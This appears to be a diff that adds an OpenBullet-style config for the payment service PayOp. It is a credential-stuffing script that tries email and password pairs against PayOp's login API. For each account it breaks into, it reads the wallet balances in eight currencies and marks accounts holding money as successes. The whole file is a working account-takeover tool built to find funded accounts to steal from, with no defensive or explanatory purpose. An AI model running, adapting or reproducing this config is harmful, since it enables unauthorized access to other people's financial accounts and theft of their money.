@@ -1,0 +1,96 @@
+[SETTINGS]
+{
+  "Name": "PayOp",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-19T18:44:50.4521344-04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "i wanna die#0001",
+  "Version": "1.2.1",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://payop.com/v1/users/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\":{\"id\":\"" 
+  KEYCHAIN Failure OR 
+    KEY "User not found" 
+
+REQUEST GET "https://payop.com/v1/wallets/available-amounts-for-currency/USD" 
+  
+  HEADER "Host: payop.com" 
+  HEADER "Referer: https://payop.com/en/profile/overview" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "token: <HEADERS(token)>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+
+PARSE "<SOURCE>" LR "US Dollar\",\"amount\":\"" "\"" CreateEmpty=FALSE -> CAP "USD" 
+
+PARSE "<SOURCE>" LR "Euro\",\"amount\":\"" "\"" CreateEmpty=FALSE -> CAP "EUR" 
+
+PARSE "<SOURCE>" LR "Pound Sterling\",\"amount\":\"" "\"" CreateEmpty=FALSE -> CAP "GBP" 
+
+PARSE "<SOURCE>" LR "CHF\",\"title\":\"Swiss Franc\",\"amount\":\"" "\"" CreateEmpty=FALSE -> CAP "CHF" 
+
+PARSE "<SOURCE>" LR "\":\"CAD\",\"title\":\"Canadian Dollar\",\"amount\":\"" "\"" CreateEmpty=FALSE -> CAP "CAD" 
+
+PARSE "<SOURCE>" LR "code\":\"AUD\",\"title\":\"Australian Dollar\",\"amount\":\"" "\"" CreateEmpty=FALSE -> CAP "AUD" 
+
+PARSE "<SOURCE>" LR "\"RUB\",\"title\":\"Russian Ruble\",\"amount\":\"" "\"" CreateEmpty=FALSE -> CAP "RUB" 
+
+PARSE "<SOURCE>" LR "Hryvnia\",\"amount\":\"" "\"" CreateEmpty=FALSE -> CAP "UAH" 
+
+KEYCHECK 
+  KEYCHAIN Custom "CUSTOM" AND 
+    KEY "<USD>" EqualTo "0.0000" 
+    KEY "<EUR>" EqualTo "0.0000" 
+    KEY "<GBP>" EqualTo "0.0000" 
+    KEY "<CHF>" EqualTo "0.0000" 
+    KEY "<CAD>" EqualTo "0.0000" 
+    KEY "<AUD>" EqualTo "0.0000" 
+    KEY "<RUB>" EqualTo "0.0000" 
+    KEY "<UAH>" EqualTo "0.0000" 
+  KEYCHAIN Success OR 
+    KEY "<USD>" NotEqualTo "0.0000" 
+    KEY "<EUR>" NotEqualTo "0.0000" 
+    KEY "<GBP>" NotEqualTo "0.0000" 
+    KEY "<CHF>" NotEqualTo "0.0000" 
+    KEY "<CAD>" NotEqualTo "0.0000" 
+    KEY "<AUD>" NotEqualTo "0.0000" 
+    KEY "<RUB>" NotEqualTo "0.0000" 
+    KEY "<UAH>" NotEqualTo "0.0000" 
+
